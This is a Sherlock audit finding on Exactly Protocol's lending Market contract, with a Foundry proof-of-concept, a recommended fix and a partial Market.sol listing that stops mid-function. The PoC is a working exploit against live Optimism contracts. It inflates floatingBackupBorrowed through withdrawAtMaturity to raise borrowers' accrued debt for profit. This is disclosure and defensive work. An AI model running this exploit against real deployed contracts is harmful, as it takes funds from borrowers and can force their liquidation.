{
  "Title": "M-5: Manipulation of the floating debt by updating `floatingBackupBorrowed`",
  "Content": "# Issue M-5: Manipulation of the floating debt by updating `floatingBackupBorrowed` \n\nSource: https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/72 \n\n## Found by \n0x73696d616f, KupiaSec, Shield, santipu\\_\n## Summary\n\nAn attacker can update the variable `floatingBackupBorrowed` without updating the floating debt. This will change the utilization rate of the market without accruing the past floating debt, thus manipulating the unrealized debt, making it too high, and stealing funds from borrowers. \n\n## Vulnerability Detail\n\nThe floating interest rate directly depends on the utilization rate of the market, the higher the utilization, the higher the interest rate. Whenever the utilization rate of the market is updated, the floating debt must be accrued before. This is necessary to accrue all debt based on past utilization and not on the updated one to avoid manipulation. \n\nThis behavior is correctly implemented whenever we update `floatingDebt` and `floatingAssets`. Before these two values are updated, the past floating debt is accrued, we can check it in the following functions:\n\n- [deposit/mint](https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L711)\n- [withdraw/redeem](https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L700)\n- [borrow](https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L150)\n- [repay/refund](https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L211)\n\nHowever, the utilization rate on the market depends on one more value, and that is the `floatingBackupBorrowed`. The issue is that when this value is updated (in the fixed-pool functions), the floating debt is not updated first. This issue will cause that when the floating debt hasn't been updated in a while, an attacker can update the value of `floatingBackupBorrowed`, manipulating the previously accrued debt, making it higher or lower than it should be. \n\nCurrently, 3 functions update the value of `floatingBackupBorrowed` without accruing the floating debt first:\n\n1. `withdrawAtMaturity`\n2. `repayAtMaturity`\n3. `depositAtMaturity`\n\nWith the functions `repayAtMaturity` and `depositAtMaturity`, an attacker could deflate `floatingBackupBorrowed`, thus lowering the past accrued debt and making the borrowers of the floating pool pay less debt than they should. \n\nHowever, an attacker can also use the function `withdrawAtMaturity` to inflate `floatingBackupBorrowed`, thus artificially incrementing the past accrued debt and making the borrowers of the floating pool pay more debt than they should. This attack would be profitable for the lenders of the floating pool because they'd receive more funds from the borrowers. Moreover, this unexpected jump in the accrued debt could make some borrowers go underwater and get liquidated. \n\n## Impact\n\nAn attacker can call `withdrawAtMaturity` to inflate the value of `floatingBackupBorrowed` and artificially increment the accrued debt that the borrowers should pay lenders on the floating pool. This attack would profit the floating lenders while causing some borrowers to go into liquidation. \n\n## PoC\n\nThe following PoC executes this attack on the live contracts of Exactly in the Optimism chain. The test can be pasted into a new file within a forge environment. Also, the `.env` file must include the variable `OPTIMISM_RPC_URL` for the test to run. The test can be executed with the following command:\n\n```solidity\nforge test --match-test test_backup_borrowed --evm-version cancun\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\nimport { Market } from \"protocol/contracts/Market.sol\";\nimport { InterestRateModel } from \"protocol/contracts/InterestRateModel.sol\";\nimport { FixedLib } from \"protocol/contracts/utils/FixedLib.sol\";\nimport {Test, console2, console} from \"forge-std/Test.sol\";\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n}\n\ncontract TestMarket is Test {\n\n    Market marketOP = Market(0xa430A427bd00210506589906a71B54d6C256CEdb);\n    Market marketUSDC = Market(0x81C9A7B55A4df39A9B7B5F781ec0e53539694873);\n\n    IERC20 optimism = IERC20(0x4200000000000000000000000000000000000042); \n    IERC20 usdc = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);\n\n    uint256 public optimismFork;\n    string OPTIMISM_RPC_URL = vm.envString(\"OPTIMISM_RPC_URL\");\n\n    function setUp() public {\n        optimismFork = vm.createSelectFork(OPTIMISM_RPC_URL);\n        assertEq(optimismFork, vm.activeFork());\n    }\n\n    function test_backup_borrowed() public {\n        vm.rollFork(119348257); // Abr 28\n        uint256 maturity = block.timestamp - (block.timestamp % 4 weeks) + 16 weeks;\n        uint256 floatingLiquidity = 1_000_000e18;\n        uint256 fixedLiquidity = 500_000e18;\n\n        // Malicious user has deposited at variable rate on the OP market\n        deal(address(optimism), address(this), floatingLiquidity);\n        optimism.approve(address(marketOP), floatingLiquidity);\n        marketOP.deposit(floatingLiquidity, address(this));\n        marketOP.auditor().enterMarket(marketOP);\n\n        vm.warp(block.timestamp + 2 weeks);\n\n        // Simulate users borrowing from the OP market at fixed and floating rate\n        address user = makeAddr(\"user\");\n        vm.startPrank(user);\n        deal(address(usdc), user, 5_500_000e6);\n        usdc.approve(address(marketUSDC), 5_500_000e6);\n        marketUSDC.deposit(5_500_000e6, user);\n        marketUSDC.auditor().enterMarket(marketUSDC);\n        marketOP.borrowAtMaturity(maturity, 500_000e18, type(uint256).max, user, user);\n        marketOP.borrow(500_000e18, user, user);\n        vm.stopPrank();\n\n        // Malicious user provides liquidity for the fixed pool\n        deal(address(optimism), address(this), fixedLiquidity);\n        optimism.approve(address(marketOP), fixedLiquidity);\n        uint256 positionAssets = marketOP.depositAtMaturity(maturity, fixedLiquidity, 0, address(this));\n\n        vm.warp(maturity - 1 days);\n\n        uint256 floatingLiquidityBefore = marketOP.previewRedeem(marketOP.balanceOf(address(this)));\n\n        // Malicious user executes the attack (withdraws all from fixed pool before maturity)\n        uint256 assetsDiscounted = marketOP.withdrawAtMaturity(maturity, positionAssets, 0, address(this), address(this));\n\n        uint256 floatingLiquidityAfter = marketOP.previewRedeem(marketOP.balanceOf(address(this)));\n        uint256 profits = floatingLiquidityAfter - floatingLiquidityBefore;\n\n        // Before the attack, the attacker owned 1,003,236 OP tokens\n        assertEq(floatingLiquidityBefore, 1_003_236.895405543416809745e18);\n\n        // After the attack, the attacker owns 1,027,162 OP tokens\n        assertEq(floatingLiquidityAfter, 1_027_162.288501014638447865e18);\n\n        // The attacker has made a profit of 23,925 OP tokens\n        assertEq(profits, 23_925.39309547122163812e18);\n\n        // The cost of the attack (early withdraw) is 488 OP tokens\n        assertEq(positionAssets - assetsDiscounted, 488.538063290105034868e18);\n    }\n}\n```\n\n**Note:** The values used on the PoC are intentionally chosen or inflated to demonstrate the bug in the implementation, and they do not affect the validity of this issue. \n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L363\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nTo mitigate this issue is recommended to accrue the floating debt always before updating the value of `floatingBackupBorrowed`. An example of the implementation fix could be the following:\n\n```diff\n\n  function depositAtMaturity(\n    uint256 maturity,\n    uint256 assets,\n    uint256 minAssetsRequired,\n    address receiver\n  ) external whenNotPaused whenNotFrozen returns (uint256 positionAssets) {\n    // ...\n      \n+   depositToTreasury(updateFloatingDebt());\n\n    floatingBackupBorrowed -= pool.deposit(assets);\n    // ...\n  }\n  \n  function withdrawAtMaturity(\n    uint256 maturity,\n    uint256 positionAssets,\n    uint256 minAssetsRequired,\n    address receiver,\n    address owner\n  ) external whenNotPaused returns (uint256 assetsDiscounted) {\n    // ...\n    \n+   depositToTreasury(updateFloatingDebt());\n    \n    floatingBackupBorrowed = newFloatingBackupBorrowed;\n    \n    // ...\n  }\n  \n  function noTransferRepayAtMaturity(\n    uint256 maturity,\n    uint256 positionAssets,\n    uint256 maxAssets,\n    address borrower,\n    bool canDiscount\n  ) internal returns (uint256 actualRepayAssets) {\n    // ...\n    \n+   depositToTreasury(updateFloatingDebt());\n\n    floatingBackupBorrowed -= pool.repay(principalCovered);\n\n    // ...\n  }\n\n```\n\n\n\n## Discussion\n\n**santipu03**\n\nThe root cause of this issue (and its duplicates) is the missing update of floating debt in some key functions such as `depositAtMaturity`, `withdrawAtMaturity`, `noTransferRepayAtMaturity`, and `liquidate`.\n\nIssues that describe the same root cause but fail to describe a valid attack path and a clear impact have been marked invalid. \n\n**sherlock-admin2**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/exactly/protocol/pull/722\n\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/247",
  "Code": [
    {
      "filename": "protocol/contracts/Market.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.17;\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { FixedPointMathLib } from \"solmate/src/utils/FixedPointMathLib.sol\";\nimport { PausableUpgradeable } from \"@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol\";\nimport { MathUpgradeable as Math } from \"@openzeppelin/contracts-upgradeable/utils/math/MathUpgradeable.sol\";\nimport { AccessControlUpgradeable } from \"@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol\";\nimport { ERC4626, ERC20, SafeTransferLib } from \"solmate/src/mixins/ERC4626.sol\";\nimport { InterestRateModel } from \"./InterestRateModel.sol\";\nimport { RewardsController } from \"./RewardsController.sol\";\nimport { FixedLib } from \"./utils/FixedLib.sol\";\nimport { Auditor } from \"./Auditor.sol\";\n\ncontract Market is Initializable, AccessControlUpgradeable, PausableUpgradeable, ERC4626 {\n  using FixedPointMathLib for int256;\n  using FixedPointMathLib for uint256;\n  using FixedPointMathLib for uint128;\n  using SafeTransferLib for ERC20;\n  using FixedLib for FixedLib.Pool;\n  using FixedLib for FixedLib.Position;\n  using FixedLib for uint256;\n\n  bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\n  bytes32 public constant EMERGENCY_ADMIN_ROLE = keccak256(\"EMERGENCY_ADMIN_ROLE\");\n\n  /// @custom:oz-upgrades-unsafe-allow state-variable-immutable\n  Auditor public immutable auditor;\n\n  /// @notice Tracks account's fixed deposit positions by maturity, account and position.\n  mapping(uint256 => mapping(address => FixedLib.Position)) public fixedDepositPositions;\n  /// @notice Tracks account's fixed borrow positions by maturity, account and position.\n  mapping(uint256 => mapping(address => FixedLib.Position)) public fixedBorrowPositions;\n  /// @notice Tracks fixed pools state by maturity.\n  mapping(uint256 => FixedLib.Pool) public fixedPools;\n\n  /// @notice Tracks fixed deposit and borrow map and floating borrow shares of an account.\n  mapping(address => Account) public accounts;\n\n  /// @notice Amount of assets lent by the floating pool to the fixed pools.\n  uint256 public floatingBackupBorrowed;\n  /// @notice Amount of assets lent by the floating pool to accounts.\n  uint256 public floatingDebt;\n\n  /// @notice Accumulated earnings from extraordinary sources to be gradually distributed.\n  uint256 public earningsAccumulator;\n  /// @notice Rate per second to be charged to delayed fixed pools borrowers after maturity.\n  uint256 public penaltyRate;\n  /// @notice Rate charged to the fixed pool to be retained by the floating pool for initially providing liquidity.\n  uint256 public backupFeeRate;\n  /// @notice Damp speed factor to update `floatingAssetsAverage` when `floatingAssets` is higher.\n  uint256 public dampSpeedUp;\n  /// @notice Damp speed factor to update `floatingAssetsAverage` when `floatingAssets` is lower.\n  uint256 public dampSpeedDown;\n\n  /// @notice Number of fixed pools to be active at the same time.\n  uint8 public maxFuturePools;\n  /// @notice Last time the accumulator distributed earnings.\n  uint32 public lastAccumulatorAccrual;\n  /// @notice Last time the floating debt was updated.\n  uint32 public lastFloatingDebtUpdate;\n  /// @notice Last time the floating assets average was updated.\n  uint32 public lastAverageUpdate;\n\n  /// @notice Interest rate model contract used to get the borrow rates.\n  InterestRateModel public interestRateModel;\n\n  /// @notice Factor used for gradual accrual of earnings to the floating pool.\n  uint128 public earningsAccumulatorSmoothFactor;\n  /// @notice Percentage factor that represents the liquidity reserves that can't be borrowed.\n  uint128 public reserveFactor;\n\n  /// @notice Amount of floating assets deposited to the pool.\n  uint256 public floatingAssets;\n  /// @notice Average of the floating assets to get fixed borrow rates and prevent rate manipulation.\n  uint256 public floatingAssetsAverage;\n\n  /// @notice Total amount of floating borrow shares assigned to floating borrow accounts.\n  uint256 public totalFloatingBorrowShares;\n\n  /// @dev gap from deprecated state.\n  /// @custom:oz-renamed-from floatingUtilization\n  uint256 private __gap;\n\n  /// @notice Address of the treasury that will receive the allocated earnings.\n  address public treasury;\n  /// @notice Rate to be charged by the treasury to floating and fixed borrows.\n  uint256 public treasuryFeeRate;\n\n  /// @notice Address of the rewards controller that will accrue rewards for accounts operating with the Market.\n  RewardsController public rewardsController;\n\n  /// @notice Flag to prevent new borrows and deposits.\n  bool public isFrozen;\n\n  /// @custom:oz-upgrades-unsafe-allow constructor\n  constructor(ERC20 asset_, Auditor auditor_) ERC4626(asset_, \"\", \"\") {\n    auditor = auditor_;\n\n    _disableInitializers();\n  }\n\n  /// @notice Initializes the contract.\n  /// @dev can only be called once.\n  function initialize(\n    string calldata assetSymbol,\n    uint8 maxFuturePools_,\n    uint128 earningsAccumulatorSmoothFactor_,\n    InterestRateModel interestRateModel_,\n    uint256 penaltyRate_,\n    uint256 backupFeeRate_,\n    uint128 reserveFactor_,\n    uint256 dampSpeedUp_,\n    uint256 dampSpeedDown_\n  ) external initializer {\n    __AccessControl_init();\n    __Pausable_init();\n\n    lastAccumulatorAccrual = uint32(block.timestamp);\n    lastFloatingDebtUpdate = uint32(block.timestamp);\n    lastAverageUpdate = uint32(block.timestamp);\n\n    _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);\n\n    setAssetSymbol(assetSymbol);\n    setMaxFuturePools(maxFuturePools_);\n    setEarningsAccumulatorSmoothFactor(earningsAccumulatorSmoothFactor_);\n    setInterestRateModel(interestRateModel_);\n    setPenaltyRate(penaltyRate_);\n    setBackupFeeRate(backupFeeRate_);\n    setReserveFactor(reserveFactor_);\n    setDampSpeed(dampSpeedUp_, dampSpeedDown_);\n  }\n\n  /// @notice Borrows a certain amount from the floating pool.\n  /// @param assets amount to be sent to receiver and repaid by borrower.\n  /// @param receiver address that will receive the borrowed assets.\n  /// @param borrower address that will repay the borrowed assets.\n  /// @return borrowShares shares corresponding to the borrowed assets.\n  function borrow(\n    uint256 assets,\n    address receiver,\n    address borrower\n  ) external whenNotPaused whenNotFrozen returns (uint256 borrowShares) {\n    spendAllowance(borrower, assets);\n\n    RewardsController memRewardsController = rewardsController;\n    if (address(memRewardsController) != address(0)) memRewardsController.handleBorrow(borrower);\n\n    depositToTreasury(updateFloatingDebt());\n\n    borrowShares = previewBorrow(assets);\n\n    uint256 newFloatingDebt = floatingDebt + assets;\n    floatingDebt = newFloatingDebt;\n    // check if the underlying liquidity that the account wants to withdraw is borrowed, also considering the reserves\n    if (floatingBackupBorrowed + newFloatingDebt > floatingAssets.mulWadDown(1e18 - reserveFactor)) {\n      revert InsufficientProtocolLiquidity();\n    }\n\n    totalFloatingBorrowShares += borrowShares;\n    accounts[borrower].floatingBorrowShares += borrowShares;\n\n    emit Borrow(msg.sender, receiver, borrower, assets, borrowShares);\n    emitMarketUpdate();\n\n    auditor.checkBorrow(this, borrower);\n    asset.safeTransfer(receiver, assets);\n  }\n\n  /// @notice Repays a certain amount of assets to the floating pool.\n  /// @param assets assets to be subtracted from the borrower's accountability.\n  /// @param borrower address of the account that has the debt.\n  /// @return actualRepay the actual amount that should be transferred into the protocol.\n  /// @return borrowShares subtracted shares from the borrower's accountability.\n  function repay(\n    uint256 assets,\n    address borrower\n  ) external whenNotPaused returns (uint256 actualRepay, uint256 borrowShares) {\n    (actualRepay, borrowShares) = noTransferRefund(previewRepay(assets), borrower);\n    emitMarketUpdate();\n    asset.safeTransferFrom(msg.sender, address(this), actualRepay);\n  }\n\n  /// @notice Repays a certain amount of shares to the floating pool.\n  /// @param borrowShares shares to be subtracted from the borrower's accountability.\n  /// @param borrower address of the account that has the debt.\n  /// @return assets subtracted assets from the borrower's accountability.\n  /// @return actualShares actual subtracted shares from the borrower's accountability.\n  function refund(\n    uint256 borrowShares,\n    address borrower\n  ) external whenNotPaused returns (uint256 assets, uint256 actualShares) {\n    (assets, actualShares) = noTransferRefund(borrowShares, borrower);\n    emitMarketUpdate();\n    asset.safeTransferFrom(msg.sender, address(this), assets);\n  }\n\n  /// @notice Allows to (partially) repay a floating borrow. It does not transfer assets.\n  /// @param borrowShares shares to be subtracted from the borrower's accountability.\n  /// @param borrower the address of the account that has the debt.\n  /// @return assets the actual amount that should be transferred into the protocol.\n  /// @return actualShares actual subtracted shares from the borrower's accountability.\n  function noTransferRefund(\n    uint256 borrowShares,\n    address borrower\n  ) internal returns (uint256 assets, uint256 actualShares) {\n    RewardsController memRewardsController = rewardsController;\n    if (address(memRewardsController) != address(0)) memRewardsController.handleBorrow(borrower);\n\n    depositToTreasury(updateFloatingDebt());\n    Account storage account = accounts[borrower];\n    uint256 accountBorrowShares = account.floatingBorrowShares;\n    actualShares = Math.min(borrowShares, accountBorrowShares);\n    assets = previewRefund(actualShares);\n\n    if (assets == 0) revert ZeroRepay();\n\n    floatingDebt -= assets;\n    account.floatingBorrowShares = accountBorrowShares - actualShares;\n    totalFloatingBorrowShares -= actualShares;\n\n    emit Repay(msg.sender, borrower, assets, actualShares);\n  }\n\n  /// @notice Deposits a certain amount to a maturity.\n  /// @param maturity maturity date where the assets will be deposited.\n  /// @param assets amount to receive from the msg.sender.\n  /// @param minAssetsRequired minimum amount of assets required by the depositor for the transaction to be accepted.\n  /// @param receiver address that will be able to withdraw the deposited assets.\n  /// @return positionAssets total amount of assets (principal + fee) to be withdrawn at maturity.\n  function depositAtMaturity(\n    uint256 maturity,\n    uint256 assets,\n    uint256 minAssetsRequired,\n    address receiver\n  ) external whenNotPaused whenNotFrozen returns (uint256 positionAssets) {\n    if (assets == 0) revert ZeroDeposit();\n    // reverts on failure\n    FixedLib.checkPoolState(maturity, maxFuturePools, FixedLib.State.VALID, FixedLib.State.NONE);\n\n    FixedLib.Pool storage pool = fixedPools[maturity];\n\n    uint256 backupEarnings = pool.accrueEarnings(maturity);\n    floatingAssets += backupEarnings;\n\n    (uint256 fee, uint256 backupFee) = pool.calculateDeposit(assets, backupFeeRate);\n    positionAssets = assets + fee;\n    if (positionAssets < minAssetsRequired) revert Disagreement();\n\n    floatingBackupBorrowed -= pool.deposit(assets);\n    pool.unassignedEarnings -= fee + backupFee;\n    earningsAccumulator += backupFee;\n\n    // update account's position\n    FixedLib.Position storage position = fixedDepositPositions[maturity][receiver];\n\n    // if account doesn't have a current position, add it to the list\n    if (position.principal == 0) {\n      Account storage account = accounts[receiver];\n      account.fixedDeposits = account.fixedDeposits.setMaturity(maturity);\n    }\n\n    position.principal += assets;\n    position.fee += fee;\n\n    emit DepositAtMaturity(maturity, msg.sender, receiver, assets, fee);\n    emitMarketUpdate();\n    emitFixedEarningsUpdate(maturity);\n\n    asset.safeTransferFrom(msg.sender, address(this), assets);\n  }\n\n  /// @notice Borrows a certain amount from a maturity.\n  /// @param maturity maturity date for repayment.\n  /// @param assets amount to be sent to receiver and repaid by borrower.\n  /// @param maxAssets maximum amount of debt that the account is willing to accept.\n  /// @param receiver address that will receive the borrowed assets.\n  /// @param borrower address that will repay the borrowed assets.\n  /// @return assetsOwed total amount of assets (principal + fee) to be repaid at maturity.\n  function borrowAtMaturity(\n    uint256 maturity,\n    uint256 assets,\n    uint256 maxAssets,\n    address receiver,\n    address borrower\n  ) external whenNotPaused whenNotFrozen returns (uint256 assetsOwed) {\n    if (assets == 0) revert ZeroBorrow();\n    // reverts on failure\n    FixedLib.checkPoolState(maturity, maxFuturePools, FixedLib.State.VALID, FixedLib.State.NONE);\n\n    FixedLib.Pool storage pool = fixedPools[maturity];\n    floatingAssets += pool.accrueEarnings(maturity);\n\n    RewardsController memRewardsController = rewardsController;\n    if (address(memRewardsController) != address(0)) memRewardsController.handleBorrow(borrower);\n\n    {\n      uint256 backupDebtAddition = pool.borrow(assets);\n      if (backupDebtAddition != 0) {\n        uint256 newFloatingBackupBorrowed = floatingBackupBorrowed + backupDebtAddition;\n        depositToTreasury(updateFloatingDebt());\n        if (newFloatingBackupBorrowed + floatingDebt > floatingAssets.mulWadDown(1e18 - reserveFactor)) {\n          revert InsufficientProtocolLiquidity();\n        }\n        floatingBackupBorrowed = newFloatingBackupBorrowed;\n      }\n    }\n    uint256 fee;\n    {\n      uint256 memFloatingAssetsAverage = previewFloatingAssetsAverage();\n      uint256 memFloatingDebt = floatingDebt;\n      uint256 fixedRate = interestRateModel.fixedRate(\n        maturity,\n        maxFuturePools,\n        fixedUtilization(pool.supplied, pool.borrowed, memFloatingAssetsAverage),\n        floatingUtilization(memFloatingAssetsAverage, memFloatingDebt),\n        globalUtilization(memFloatingAssetsAverage, memFloatingDebt, floatingBackupBorrowed)\n      );\n      fee = assets.mulWadDown(fixedRate.mulDivDown(maturity - block.timestamp, 365 days));\n    }\n    assetsOwed = assets + fee;\n\n    // validate that the account is not taking arbitrary fees\n    if (assetsOwed > maxAssets) revert Disagreement();\n\n    spendAllowance(borrower, assetsOwed);\n\n    {\n      // if account doesn't have a current position, add it to the list\n      FixedLib.Position storage position = fixedBorrowPositions[maturity][borrower];\n      if (position.principal == 0) {\n        Account storage account = accounts[borrower];\n        account.fixedBorrows = account.fixedBorrows.setMaturity(maturity);\n      }\n\n      // calculate what portion of the fees are to be accrued and what portion goes to earnings accumulator\n      (uint256 newUnassignedEarnings, uint256 newBackupEarnings) = pool.distributeEarnings(\n        chargeTreasuryFee(fee),\n        assets\n      );\n      if (newUnassignedEarnings != 0) pool.unassignedEarnings += newUnassignedEarnings;\n      collectFreeLunch(newBackupEarnings);\n\n      fixedBorrowPositions[maturity][borrower] = FixedLib.Position(position.principal + assets, position.fee + fee);\n    }\n\n    emit BorrowAtMaturity(maturity, msg.sender, receiver, borrower, assets, fee);\n    emitMarketUpdate();\n    emitFixedEarningsUpdate(maturity);\n\n    auditor.checkBorrow(this, borrower);\n    asset.safeTransfer(receiver, assets);\n  }\n\n  /// @notice Withdraws a certain amount from a maturity.\n  /// @param maturity maturity date where the assets will be withdrawn.\n  /// @param positionAssets position size to be reduced.\n  /// @param minAssetsRequired minimum amount required by the account (if discount included for early withdrawal).\n  /// @param receiver address that will receive the withdrawn assets.\n  /// @param owner address that previously deposited the assets.\n  /// @return assetsDiscounted amount of assets withdrawn (can include a discount for early withdraw).\n  function withdrawAtMaturity(\n    uint256 maturity,\n    uint256 positionAssets,\n    uint256 minAssetsRequired,\n    address receiver,\n    address owner\n  ) external whenNotPaused returns (uint256 assetsDiscounted) {\n    if (positionAssets == 0) revert ZeroWithdraw();\n    // reverts on failure\n    FixedLib.checkPoolState(maturity, maxFuturePools, FixedLib.State.VALID, FixedLib.State.MATURED);\n\n    FixedLib.Pool storage pool = fixedPools[maturity];\n    floatingAssets += pool.accrueEarnings(maturity);\n\n    FixedLib.Position memory position = fixedDepositPositions[maturity][owner];\n\n    if (positionAssets > position.principal + position.fee) positionAssets = position.principal + position.fee;\n\n    {\n      // remove the supply from the fixed rate pool\n      uint256 newFloatingBackupBorrowed = floatingBackupBorrowed +\n        pool.withdraw(\n          FixedLib.Position(position.principal, position.fee).scaleProportionally(positionAssets).principal\n        );\n      if (newFloatingBackupBorrowed + floatingDebt > floatingAssets) revert InsufficientProtocolLiquidity();\n      floatingBackupBorrowed = newFloatingBackupBorrowed;\n    }\n\n    // verify if there are any penalties/fee for the account because of early withdrawal, if so discount\n    if (block.timestamp < maturity) {\n      uint256 memFloatingAssetsAverage = previewFloatingAssetsAverage();\n      uint256 memFloatingDebt = floatingDebt;\n      uint256 memFloatingBackupBorrowed = floatingBackupBorrowed;\n\n      uint256 fixedRate = interestRateModel.fixedRate(\n        maturity,\n        maxFuturePools,\n        fixedUtilization(pool.supplied, pool.borrowed, memFloatingAssetsAverage),\n        floatingUtilization(memFloatingAssetsAverage, memFloatingDebt),\n        globalUtilization(memFloatingAssetsAverage, memFloatingDebt, memFloatingBackupBorrowed)\n      );\n      assetsDiscounted = positionAssets.divWadDown(1e18 + fixedRate.mulDivDown(maturity - block.timestamp, 365 days));\n    } else {\n      assetsDiscounted = positionAssets;\n    }\n\n    if (assetsDiscounted < minAssetsRequired) revert Disagreement();\n\n    spendAllowance(owner, assetsDiscounted);\n\n    // all the fees go to unassigned or to the floating pool\n    (uint256 unassignedEarnings, uint256 newBackupEarnings) = pool.distributeEarnings(\n      chargeTreasuryFee(positionAssets - assetsDiscounted),\n      assetsDiscounted\n    );\n    pool.unassignedEarnings += unassignedEarnings;\n    collectFreeLunch(newBackupEarnings);\n\n    // the account gets discounted the full amount\n    position.reduceProportionally(positionAssets);\n    if (position.principal | position.fee == 0) {\n      delete fixedDepositPositions[maturity][owner];\n      Account storage account = accounts[owner];\n      account.fixedDeposits = account.fixedDeposits.clearMaturity(maturity);\n    } else {\n      // proportionally reduce the values\n      fixedDepositPositions[maturity][owner] = position;\n    }\n\n    emit WithdrawAtMaturity(maturity, msg.sender, receiver, owner, positionAssets, assetsDiscounted);\n    emitMarketUpdate();\n    emitFixedEarningsUpdate(maturity);\n\n    asset.safeTransfer(receiver, assetsDiscounted);\n  }\n\n  /// @notice Repays a certain amount to a maturity.\n  /// @param maturity maturity date where the assets will be repaid.\n  /// @param positionAssets amount to be paid for the borrower's debt.\n  /// @param maxAssets maximum amount of debt that the account is willing to accept to be repaid.\n  /// @param borrower address of the account that has the debt.\n  /// @return actualRepayAssets the actual amount that was transferred into the protocol.\n  function repayAtMaturity(\n    uint256 maturity,\n    uint256 positionAssets,\n    uint256 maxAssets,\n    address borrower\n  ) external whenNotPaused returns (uint256 actualRepayAssets) {\n    // reverts on failure\n    FixedLib.checkPoolState(maturity, maxFuturePools, FixedLib.State.VALID, FixedLib.State.MATURED);\n\n    actualRepayAssets = noTransferRepayAtMaturity(maturity, positionAssets, maxAssets, borrower, true);\n    emitMarketUpdate();\n\n    asset.safeTransferFrom(msg.sender, address(this), actualRepayAssets);\n  }\n\n  /// @notice Allows to (partially) repay a fixed rate position. It does not transfer assets.\n  /// @param maturity the maturity to access the pool.\n  /// @param positionAssets the amount of debt of the pool that should be paid.\n  /// @param maxAssets maximum amount of debt that the account is willing to accept to be repaid.\n  /// @param borrower the address of the account that has the debt.\n  /// @param canDiscount should early repay discounts be applied.\n  /// @return actualRepayAssets the actual amount that should be transferred into the protocol.\n  function noTransferRepayAtMaturity(\n    uint256 maturity,\n    uint256 positionAssets,\n    uint256 maxAssets,\n    address borrower,\n    bool canDiscount\n  ) internal returns (uint256 actualRepayAssets) {\n    if (positionAssets == 0) revert ZeroRepay();\n\n    FixedLib.Pool storage pool = fixedPools[maturity];\n\n    uint256 backupEarnings = pool.accrueEarnings(maturity);\n    floatingAssets += backupEarnings;\n\n    FixedLib.Position memory position = fixedBorrowPositions[maturity][borrower];\n\n    uint256 debtCovered = Math.min(positionAssets, position.principal + position.fee);\n\n    uint256 principalCovered = FixedLib\n      .Position(position.principal, position.fee)\n      .scaleProportionally(debtCovered)\n      .principal;\n\n    RewardsController memRewardsController = rewardsController;\n    if (address(memRewardsController) != address(0)) memRewardsController.handleBorrow(borrower);\n\n    // early repayment allows a discount from the unassigned earnings\n    if (block.timestamp < maturity) {\n      if (canDiscount) {\n        // calculate the deposit fee considering the amount of debt the account'll pay\n        (uint256 discountFee, uint256 backupFee) = pool.calculateDeposit(principalCovered, backupFeeRate);\n\n        // remove the fee from unassigned earnings\n        pool.unassignedEarnings -= discountFee + backupFee;\n\n        // the fee charged to the fixed pool supplier goes to the earnings accumulator\n        earningsAccumulator += backupFee;\n\n        // the fee gets discounted from the account through `actualRepayAssets`\n        actualRepayAssets = debtCovered - discountFee;\n      } else {\n        actualRepayAssets = debtCovered;\n      }\n    } else {\n      actualRepayAssets = debtCovered + debtCovered.mulWadDown((block.timestamp - maturity) * penaltyRate);\n\n      // all penalties go to the earnings accumulator\n      earningsAccumulator += actualRepayAssets - debtCovered;\n    }\n\n    // verify that the account agrees to this discount or penalty\n    if (actualRepayAssets > maxAssets) revert Disagreement();\n\n    // reduce the borrowed from the pool and might decrease the floating backup borrowed\n    floatingBackupBorrowed -= pool.repay(principalCovered);\n\n    // update the account position\n    position.reduceProportionally(debtCovered);\n    if (position.principal | position.fee == 0) {\n      delete fixedBorrowPositions[maturity][borrower];\n      Account storage account = accounts[borrower];\n      account.fixedBorrows = account.fixedBorrows.clearMaturity(maturity);\n    } else {\n      // proportionally reduce the values\n      fixedBorrowPositions[maturity][borrower] = position;\n    }\n\n    emit RepayAtMaturity(maturity, msg.sender, borrower, actualRepayAssets, debtCovered);\n    emitFixedEarningsUpdate(maturity);\n  }\n\n  /// @notice Liquidates undercollateralized fixed/floating (or both) position(s).\n  /// @dev Msg.sender liquidates borrower's position(s) and repays a certain amount of debt for the floating pool,\n  /// or/and for multiple fixed pools, seizing a portion of borrower's collateral.\n  /// @param borrower account that has an outstanding debt across floating or fixed pools.\n  /// @param maxAssets maximum amount of debt that the liquidator is willing to accept. (it can be less)\n  /// @param seizeMarket market from which the collateral will be seized to give to the liquidator.\n  /// @return repaidAssets actual amount repaid.\n  function liquidate(\n    address borrower,\n    uint256 maxAssets,\n    Market seizeMarket\n  ) external whenNotPaused returns (uint256 repaidAssets) {\n    if (msg.sender == borrower) revert SelfLiquidation();\n\n    maxAssets = auditor.checkLiquidation(this, seizeMarket, borrower, maxAssets);\n    if (maxAssets == 0) revert ZeroRepay();\n\n    Account storage account = accounts[borrower];\n\n    {\n      uint256 packedMaturities = account.fixedBorrows;\n      uint256 maturity = packedMaturities & ((1 << 32) - 1);\n      packedMaturities = packedMaturities >> 32;\n      while (packedMaturities != 0 && maxAssets != 0) {\n        if (packedMaturities & 1 != 0) {\n          uint256 actualRepay;\n          if (block.timestamp < maturity) {\n            actualRepay = noTransferRepayAtMaturity(maturity, maxAssets, maxAssets, borrower, false);\n            maxAssets -= actualRepay;\n          } else {\n            uint256 position;\n            {\n              FixedLib.Position storage p = fixedBorrowPositions[maturity][borrower];\n              position = p.principal + p.fee;\n            }\n            uint256 debt = 